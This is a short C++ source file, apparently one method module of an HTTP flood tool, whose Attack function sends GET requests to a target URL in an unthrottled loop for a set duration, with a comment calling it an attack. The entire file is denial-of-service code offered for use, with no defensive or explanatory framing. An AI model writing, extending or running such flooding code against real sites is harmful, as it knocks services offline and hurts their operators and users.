#include "Methods/HTTP.h"

void HTTP_METHOD::Attack(std::string url, int nDuration) {
	HTTPClient http { false };
	time_t start_time = time(nullptr);
	float elapsed_time = 0.f;
	/* Attack to the specified URL during the specified time. */
	while (elapsed_time < nDuration) {
		time_t end_time = time(nullptr);
		elapsed_time = (float)end_time - (float)start_time;
		
		http.GET(url, ADDR_TYPE::IPv4);
	}

	return;
}